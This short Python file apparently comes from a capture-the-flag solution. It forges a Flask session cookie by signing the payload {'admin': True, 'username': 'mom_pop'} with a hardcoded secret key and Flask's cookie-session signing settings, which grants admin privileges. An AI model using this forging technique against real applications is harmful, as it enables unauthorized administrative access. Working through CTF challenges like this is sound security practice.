# note: this file is no longer needed as solve.py contains all of this
import hashlib
from flask import Flask
from itsdangerous import TimestampSigner, URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

session = {"admin":True,"username":"mom_pop"}

def solve():
    s = URLSafeTimedSerializer(
        secret_key='flour_sugar_chocolate_and_lotsalove',
        salt='cookie-session',
        serializer=TaggedJSONSerializer(),
        signer=TimestampSigner,
        signer_kwargs={
            'key_derivation': 'hmac',
            'digest_method': hashlib.sha1
        }
    )
    return s.dumps(session)
